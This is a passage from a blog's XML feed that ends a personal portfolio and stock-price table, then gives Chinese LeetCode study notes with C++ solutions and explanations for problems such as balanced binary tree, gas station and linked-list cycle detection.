align="center">50000</td></tr><tr><td align="center">6月19日</td><td align="center">投资组合</td><td align="center">33618</td><td align="center">-222</td><td align="center">50000</td></tr><tr><td align="center">6月20日</td><td align="center">投资组合</td><td align="center">33974</td><td align="center">+356</td><td align="center">50000</td></tr><tr><td align="center">6月23日</td><td align="center">投资组合</td><td align="center">33010</td><td align="center">+1227</td><td align="center">50000</td></tr><tr><td align="center">6月24日</td><td align="center">投资组合</td><td align="center">33319</td><td align="center">+1021</td><td align="center">50000</td></tr><tr><td align="center">6月25日</td><td align="center">投资组合</td><td align="center">30824</td><td align="center">-1859</td><td align="center">50000</td></tr><tr><td align="center">6月26日</td><td align="center">投资组合</td><td align="center">30382</td><td align="center">-442</td><td align="center">50000</td></tr><tr><td align="center">6月27日</td><td align="center">投资组合</td><td align="center">31421</td><td align="center">+155</td><td align="center">50000</td></tr><tr><td align="center">6月30日</td><td align="center">投资组合</td><td align="center">33820</td><td align="center">+2399</td><td align="center">50000</td></tr><tr><td align="center">7月1日</td><td align="center">投资组合</td><td align="center">34524</td><td align="center">+704</td><td align="center">50000</td></tr><tr><td align="center">7月2日</td><td align="center">投资组合</td><td align="center">34020</td><td align="center">-504</td><td align="center">50000</td></tr><tr><td align="center">7月3日</td><td align="center">投资组合</td><td align="center">35742</td><td align="center">+1722</td><td align="center">50000</td></tr><tr><td align="center">7月4日</td><td align="center">投资组合</td><td align="center">34702</td><td align="center">-1040</td><td align="center">50000</td></tr><tr><td align="center">7月14日</td><td align="center">投资组合</td><td align="center">31955</td><td align="center">-187</td><td align="center">50000</td></tr><tr><td align="center">7月15日</td><td align="center">投资组合</td><td align="center">31743</td><td align="center">-212</td><td align="center">50000</td></tr><tr><td align="center">7月16日</td><td align="center">投资组合</td><td align="center">33958</td><td align="center">+689</td><td align="center">50000</td></tr><tr><td align="center">7月17日</td><td align="center">投资组合</td><td align="center">33967</td><td align="center">+9</td><td align="center">50000</td></tr><tr><td align="center">7月18日</td><td align="center">投资组合</td><td align="center">34195</td><td align="center">+228</td><td align="center">50000</td></tr><tr><td align="center">7月21日</td><td align="center">投资组合</td><td align="center">35207</td><td align="center">+1012</td><td align="center">50000</td></tr><tr><td align="center">7月22日</td><td align="center">投资组合</td><td align="center">36340</td><td align="center">+1212</td><td align="center">50000</td></tr><tr><td align="center">7月23日</td><td align="center">投资组合</td><td align="center">36388</td><td align="center">+48</td><td align="center">50000</td></tr><tr><td align="center">7月24日</td><td align="center">投资组合</td><td align="center">34783</td><td align="center">+68</td><td align="center">50000</td></tr><tr><td align="center">7月25日</td><td align="center">投资组合</td><td align="center">34841</td><td align="center">+58</td><td align="center">50000</td></tr><tr><td align="center">7月28日</td><td align="center">投资组合</td><td align="center">35874</td><td align="center">+1033</td><td align="center">50000</td></tr><tr><td align="center">7月29日</td><td align="center">投资组合</td><td align="center">36365</td><td align="center">+491</td><td align="center">50000</td></tr><tr><td align="center">7月30日</td><td align="center">投资组合</td><td align="center">35980</td><td align="center">-385</td><td align="center">50000</td></tr><tr><td align="center">7月31日</td><td align="center">投资组合</td><td align="center">35542</td><td align="center">-438</td><td align="center">50000</td></tr><tr><td align="center">8月1日</td><td align="center">投资组合</td><td align="center">33378</td><td align="center">-493</td><td align="center">50000</td></tr><tr><td align="center">8月4日</td><td align="center">投资组合</td><td align="center">33507</td><td align="center">+129</td><td align="center">50000</td></tr><tr><td align="center">8月5日</td><td align="center">投资组合</td><td align="center">34524</td><td align="center">+1017</td><td align="center">50000</td></tr><tr><td align="center">8月6日</td><td align="center">投资组合</td><td align="center">35552</td><td align="center">+1028</td><td align="center">50000</td></tr><tr><td align="center">8月7日</td><td align="center">东信和平</td><td align="center">30.72</td><td align="center">9.99</td><td align="center">40.00</td></tr><tr><td align="center">8月8日</td><td align="center">东信和平</td><td align="center">28.96</td><td align="center">-5.73</td><td align="center">40.00</td></tr><tr><td align="center">8月11日</td><td align="center">东信和平</td><td align="center">29.16</td><td align="center">0.69</td><td align="center">40.00</td></tr><tr><td align="center">8月12日</td><td align="center">东信和平</td><td align="center">30.33</td><td align="center">4.01</td><td align="center">40.00</td></tr><tr><td align="center">8月13日</td><td align="center">东信和平</td><td align="center">30.80</td><td align="center">1.55</td><td align="center">40.00</td></tr><tr><td align="center">8月14日</td><td align="center">东信和平</td><td align="center">32.39</td><td align="center">5.16</td><td align="center">40.00</td></tr><tr><td align="center">8月15日</td><td align="center">东信和平</td><td align="center">31.70</td><td align="center">-2.13</td><td align="center">40.00</td></tr><tr><td align="center">8月18日</td><td align="center">东信和平</td><td align="center">34.87</td><td align="center">10.00</td><td align="center">40.00</td></tr><tr><td align="center">8月19日</td><td align="center">东信和平</td><td align="center">33.75</td><td align="center">-3.21</td><td align="center">40.00</td></tr><tr><td align="center">8月20日</td><td align="center">东信和平</td><td align="center">33.45</td><td align="center">-0.89</td><td align="center">40.00</td></tr><tr><td align="center">8月21日</td><td align="center">东信和平</td><td align="center">33.45</td><td align="center">0.00</td><td align="center">40.00</td></tr><tr><td align="center">8月22日</td><td align="center">东信和平</td><td align="center">33.18</td><td align="center">-0.81</td><td align="center">40.00</td></tr><tr><td align="center">8月25日</td><td align="center">东信和平</td><td align="center">34.02</td><td align="center">2.53</td><td align="center">40.00</td></tr><tr><td align="center">8月26日</td><td align="center">东信和平</td><td align="center">31.96</td><td align="center">-6.06</td><td align="center">40.00</td></tr><tr><td align="center">8月27日</td><td align="center">东信和平</td><td align="center">32.00</td><td align="center">0.13</td><td align="center">40.00</td></tr><tr><td align="center">8月28日</td><td align="center">东信和平</td><td align="center">30.32</td><td align="center">-5.25</td><td align="center">40.00</td></tr><tr><td align="center">8月29日</td><td align="center">东信和平</td><td align="center">28.46</td><td align="center">-6.13</td><td align="center">40.00</td></tr><tr><td align="center">9月1日</td><td align="center">东信和平</td><td align="center">30.10</td><td align="center">+5.76</td><td align="center">40.00</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>金融</category>
      
    </categories>
    
    
    <tags>
      
      <tag>投资</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Leetcode刷题笔记</title>
    <link href="/2024/07/31/Leetcode%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/"/>
    <url>/2024/07/31/Leetcode%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h4 id="常用数据结构和算法"><a href="#常用数据结构和算法" class="headerlink" title="常用数据结构和算法"></a>常用数据结构和算法</h4><h5 id="动态数组"><a href="#动态数组" class="headerlink" title="动态数组"></a>动态数组</h5><p>创建二维动态数组</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++">vector&lt;vector &lt;<span class="hljs-type">int</span>&gt; &gt; <span class="hljs-built_in">ivec</span>(m ,<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(n,<span class="hljs-number">0</span>));    <span class="hljs-comment">//m*n的二维vector，所有元素为0</span><br></code></pre></td></tr></table></figure><p>以打印杨辉三角为例</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">generate</span>(<span class="hljs-type">int</span> numRows) &#123;<br>        vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; result;<br>        <span class="hljs-keyword">if</span>(numRows &gt;= <span class="hljs-number">1</span>)<br>        result.<span class="hljs-built_in">push_back</span>(<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>));<span class="hljs-comment">// 向第一行添加一个1</span><br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> result;<br>        <span class="hljs-keyword">if</span>(numRows &gt;= <span class="hljs-number">2</span>)<br>        result.<span class="hljs-built_in">push_back</span>(<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(<span class="hljs-number">2</span>,<span class="hljs-number">1</span>));<span class="hljs-comment">// 向第二行添加2个1</span><br>      <span class="hljs-comment">// 或写成result.push_back(&#123;1,1&#125;);</span><br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> result;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">2</span>; i &lt; numRows; i++)&#123;<br>            result.<span class="hljs-built_in">push_back</span>(<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(i + <span class="hljs-number">1</span>,<span class="hljs-number">1</span>));<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt; i; j++)<br>            &#123;<br>                result[i][j] = result[i - <span class="hljs-number">1</span>][j - <span class="hljs-number">1</span>] + result[i - <span class="hljs-number">1</span>][j];<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> result;<br><br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h5 id="位运算"><a href="#位运算" class="headerlink" title="位运算"></a>位运算</h5><p>位运算可以简化很多操作，如判断一个数是否是2的幂，可以采用</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isPowerOfTwo</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> n &gt; <span class="hljs-number">0</span> &amp;&amp; (n &amp; (n - <span class="hljs-number">1</span>)) == <span class="hljs-number">0</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h4 id="LCP40-心算挑战"><a href="#LCP40-心算挑战" class="headerlink" title="LCP40 心算挑战"></a>LCP40 心算挑战</h4><h5 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h5><p>「力扣挑战赛」心算项目的挑战比赛中，要求选手从 <code>N</code> 张卡牌中选出 <code>cnt</code> 张卡牌，若这 <code>cnt</code> 张卡牌数字总和为偶数，则选手成绩「有效」且得分为 <code>cnt</code> 张卡牌数字总和。 给定数组 <code>cards</code> 和 <code>cnt</code>，其中 <code>cards[i]</code> 表示第 <code>i</code> 张卡牌上的数字。 请帮参赛选手计算最大的有效得分。若不存在获取有效得分的卡牌方案，则返回 0。</p><blockquote><p>输入：<code>cards = [1,2,8,9], cnt = 3</code></p><p>输出：<code>18</code></p><p>解释：选择数字为 1、8、9 的这三张卡牌，此时可获得最大的有效得分 1+8+9&#x3D;18。</p></blockquote><h5 id="思路和算法"><a href="#思路和算法" class="headerlink" title="思路和算法"></a>思路和算法</h5><p>将<code>cards</code>从大到小排序后，先贪心的将前<code>cnt</code>个数字加起来，若此时<code>sum</code>为偶数，直接返回即可。</p><p>若此时答案为奇数，有两种方案:</p><ul><li><p>在数组后面找到一个最大的奇数与前<code>cnt</code>个数中最小的偶数进行替换；</p></li><li><p>在数组后面找到一个最大的偶数与前<code>cnt</code>个数中最小的奇数进行替换。</p></li></ul><p>两种方案选最大值即可。</p><h5 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">maxmiumScore</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; cards, <span class="hljs-type">int</span> cnt)</span> </span>&#123;<br>        <span class="hljs-built_in">sort</span>(cards.<span class="hljs-built_in">begin</span>(), cards.<span class="hljs-built_in">end</span>(), <span class="hljs-built_in">greater</span>&lt;<span class="hljs-type">int</span>&gt;());<br>        <span class="hljs-type">int</span> score = <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> odd = <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> even = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; cnt; ++i) &#123;<br>        score += cards[i];<br>        <span class="hljs-keyword">if</span>(cards[i] %<span class="hljs-number">2</span> == <span class="hljs-number">0</span>) even = cards[i];<br>        <span class="hljs-keyword">else</span> odd = cards[i];<br>        &#125;<br>        <span class="hljs-keyword">if</span>(score % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-keyword">return</span> score;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = cnt; j &lt; cards.<span class="hljs-built_in">size</span>(); j++)<br>            &#123;<br>            <span class="hljs-keyword">if</span>(cards[j] %<span class="hljs-number">2</span> == <span class="hljs-number">0</span> &amp;&amp; odd) <br>                ans = <span class="hljs-built_in">max</span>(ans, score - odd + cards[j]);<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (even)<br>                ans = <span class="hljs-built_in">max</span>(ans, score - even + cards[j]);<br>            &#125;<br><br>        &#125;<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h5 id="复杂度分析"><a href="#复杂度分析" class="headerlink" title="复杂度分析"></a>复杂度分析</h5><p>时间复杂度：$O(nlogn)$，其中$n$为数组的长度，主要开销在排序。</p><p>空间复杂度：$O(1)$。</p><h4 id="T110-平衡二叉树"><a href="#T110-平衡二叉树" class="headerlink" title="T110 平衡二叉树"></a>T110 平衡二叉树</h4><h5 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h5><p>给定一个二叉树，判断它是否是平衡二叉树。</p><h5 id="思路和算法-1"><a href="#思路和算法-1" class="headerlink" title="思路和算法"></a>思路和算法</h5><p>根据定义，一棵二叉树是平衡二叉树，当且仅当其所有子树也都是平衡二叉树，因此可以使用递归的方式判断二叉树是不是平衡二叉树，递归的顺序可以是自顶向下或者自底向上。对于自顶向下，具体做法类似于二叉树的前序遍历，即对于当前遍历到的节点，首先计算左右子树的高度，如果左右子树的高度差是否不超过 1，再分别递归地遍历左右子节点，并判断左子树和右子树是否平衡。这是一个自顶向下的递归的过程。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">height</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">NULL</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">max</span>(<span class="hljs-built_in">height</span>(root-&gt;left), <span class="hljs-built_in">height</span>(root-&gt;right)) + <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isBalanced</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">NULL</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">abs</span>(<span class="hljs-built_in">height</span>(root-&gt;left) - <span class="hljs-built_in">height</span>(root-&gt;right)) &lt;= <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-built_in">isBalanced</span>(root-&gt;left) &amp;&amp; <span class="hljs-built_in">isBalanced</span>(root-&gt;right);<br>        &#125;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p> 由于是自顶向下递归，因此对于同一个节点，函数<code>height</code>会被重复调用，导致时间复杂度较高。如果使用自底向上的做法，则对于每个节点，函数<code>height</code>只会被调用一次。自底向上递归的做法类似于后序遍历，对于当前遍历到的节点，先递归地判断其左右子树是否平衡，再判断以当前节点为根的子树是否平衡。如果一棵子树是平衡的，则返回其高度（高度一定是非负整数），否则返回 −1。如果存在一棵子树不平衡，则整个二叉树一定不平衡。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">height</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">NULL</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>        <span class="hljs-type">int</span> leftHeight = <span class="hljs-built_in">height</span>(root-&gt;left);<br>        <span class="hljs-type">int</span> rightHeight = <span class="hljs-built_in">height</span>(root-&gt;right);<br>        <span class="hljs-keyword">if</span> (leftHeight == <span class="hljs-number">-1</span> || rightHeight == <span class="hljs-number">-1</span> || <span class="hljs-built_in">abs</span>(leftHeight - rightHeight) &gt; <span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">max</span>(leftHeight, rightHeight) + <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isBalanced</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">height</span>(root) &gt;= <span class="hljs-number">0</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h4 id="T134-加油站"><a href="#T134-加油站" class="headerlink" title="T134 加油站"></a>T134 加油站</h4><h5 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h5><p>在一条环路上有 <code>n</code> 个加油站，其中第 <code>i</code> 个加油站有汽油 <code>gas[i]</code> 升。你有一辆油箱容量无限的的汽车，从第 <code>i</code> 个加油站开往第 <code>i+1</code> 个加油站需要消耗汽油 <code>cost[i]</code> 升。你从其中的一个加油站出发，开始时油箱为空。给定两个整数数组 <code>gas</code> 和 <code>cost</code> ，如果你可以按顺序绕环路行驶一周，则返回出发时加油站的编号，否则返回 <code>-1</code> 。如果存在解，则 <strong>保证</strong> 它是 <strong>唯一</strong> 的。</p><blockquote><p> 输入: gas &#x3D; [1,2,3,4,5], cost &#x3D; [3,4,5,1,2]<br>    输出: 3<br>    解释:<br>    从 3 号加油站(索引为 3 处)出发，可获得 4 升汽油。此时油箱有 &#x3D; 0 + 4 &#x3D; 4 升汽油<br>    开往 4 号加油站，此时油箱有 4 - 1 + 5 &#x3D; 8 升汽油<br>    开往 0 号加油站，此时油箱有 8 - 2 + 1 &#x3D; 7 升汽油<br>    开往 1 号加油站，此时油箱有 7 - 3 + 2 &#x3D; 6 升汽油<br>    开往 2 号加油站，此时油箱有 6 - 4 + 3 &#x3D; 5 升汽油<br>    开往 3 号加油站，你需要消耗 5 升汽油，正好足够你返回到 3 号加油站。<br>    因此，3 可为起始索引。</p></blockquote><h5 id="思路和算法-2"><a href="#思路和算法-2" class="headerlink" title="思路和算法"></a>思路和算法</h5><p>核心的思路就是，假设我们从0行驶到5，之后就不能继续往前行驶，那么从1～5开始行驶也肯定不能往前行驶，因此从6开始考虑，这样只需要遍历一遍即可。</p><h5 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">canCompleteCircuit</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; gas, vector&lt;<span class="hljs-type">int</span>&gt;&amp; cost)</span> </span>&#123;<br>        <span class="hljs-type">int</span> n = gas.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> (i &lt; n) &#123;<br>            <span class="hljs-type">int</span> sumOfGas = <span class="hljs-number">0</span>, sumOfCost = <span class="hljs-number">0</span>;<br>            <span class="hljs-type">int</span> cnt = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">while</span> (cnt &lt; n) &#123;<br>                <span class="hljs-type">int</span> j = (i + cnt) % n;<br>                sumOfGas += gas[j];<br>                sumOfCost += cost[j];<br>                <span class="hljs-keyword">if</span> (sumOfCost &gt; sumOfGas) &#123;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>                cnt++;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (cnt == n) &#123;<br>                <span class="hljs-keyword">return</span> i;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                i = i + cnt + <span class="hljs-number">1</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h4 id="T136-只出现一次的数字"><a href="#T136-只出现一次的数字" class="headerlink" title="T136 只出现一次的数字"></a>T136 只出现一次的数字</h4><h5 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h5><p>给你一个 <strong>非空</strong> 整数数组 <code>nums</code> ，除了某个元素只出现一次以外，其余每个元素均出现两次。找出那个只出现了一次的元素。</p><p>你必须设计并实现线性时间复杂度的算法来解决此问题，且该算法只使用常量额外空间。</p><blockquote><p>输入：nums &#x3D; [4,1,2,1,2]</p><p>输出：4</p></blockquote><h5 id="思路和算法-3"><a href="#思路和算法-3" class="headerlink" title="思路和算法"></a>思路和算法</h5><p>根据异或操作的性质，只需要将数组的所有元素进行一次异或运算，得到的结果就是只出现一次的数字。C++种异或运算符为<code>^</code></p><h5 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">singleNumber</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-type">int</span> result = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; nums.<span class="hljs-built_in">size</span>(); i++)&#123;<br>            result ^= nums[i];<br>        &#125;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h4 id="T141-环形链表"><a href="#T141-环形链表" class="headerlink" title="T141 环形链表"></a>T141 环形链表</h4><h5 id="题目-4"><a href="#题目-4" class="headerlink" title="题目"></a>题目</h5><p>给你一个链表的头节点 <code>head</code> ，判断链表中是否有环。</p><p>如果链表中有某个节点，可以通过连续跟踪 <code>next</code> 指针再次到达，则链表中存在环。 为了表示给定链表中的环，评测系统内部使用整数 <code>pos</code> 来表示链表尾连接到链表中的位置（索引从 0 开始）。<strong>注意：<code>pos</code> 不作为参数进行传递</strong> 。仅仅是为了标识链表的实际情况。</p><p><em>如果链表中存在环</em> ，则返回 <code>true</code> 。 否则，返回 <code>false</code> 。</p><p><strong>示例 1：</strong></p><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/07/circularlinkedlist.png" srcset="/img/loading.gif" lazyload alt="img"></p><blockquote><p> 输入：head &#x3D; [3,2,0,-4], pos &#x3D; 1<br>    输出：true<br>    解释：链表中有一个环，其尾部连接到第二个节点。</p></blockquote><p><strong>进阶：</strong>你能用 <code>O(1)</code>（即，常量）内存解决此问题吗？</p><h5 id="思路和算法一：哈希表"><a href="#思路和算法一：哈希表" class="headerlink" title="思路和算法一：哈希表"></a>思路和算法一：哈希表</h5><p><a href="https://leetcode.cn/problems/linked-list-cycle/solutions/440042/huan-xing-lian-biao-by-leetcode-solution">https://leetcode.cn/problems/linked-list-cycle/solutions/440042/huan-xing-lian-biao-by-leetcode-solution</a></p><p>最容易想到的方法是遍历所有节点，每次遍历到一个节点时，判断该节点此前是否被访问过。</p><p>具体地，我们可以使用哈希表来存储所有已经访问过的节点。每次我们到达一个节点，如果该节点已经存在于哈希表中，则说明该链表是环形链表，否则就将该节点加入哈希表中。重复这一过程，直到我们遍历完整个链表即可。</p><h5 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">hasCycle</span><span class="hljs-params">(ListNode *head)</span> </span>&#123;<br>        unordered_set&lt;ListNode*&gt; seen;<br>        <span class="hljs-keyword">while</span> (head != <span class="hljs-literal">nullptr</span>) &#123;<br>            <span class="hljs-keyword">if</span> (seen.<span class="hljs-built_in">count</span>(head)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>            seen.<span class="hljs-built_in">insert</span>(head);<br>            head = head-&gt;next;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h5 id="复杂度分析-1"><a href="#复杂度分析-1" class="headerlink" title="复杂度分析"></a>复杂度分析</h5><p>时间复杂度：$O(N)$，其中 $N$ 是链表中的节点数。最坏情况下我们需要遍历每个节点一次。</p><p>空间复杂度：$O(N)$，其中$ N$ 是链表中的节点数。主要为哈希表的开销，最坏情况下我们需要将每个节点插入到哈希表中一次。</p><h5 id="思路和算法二：快慢指针"><a href="#思路和算法二：快慢指针" 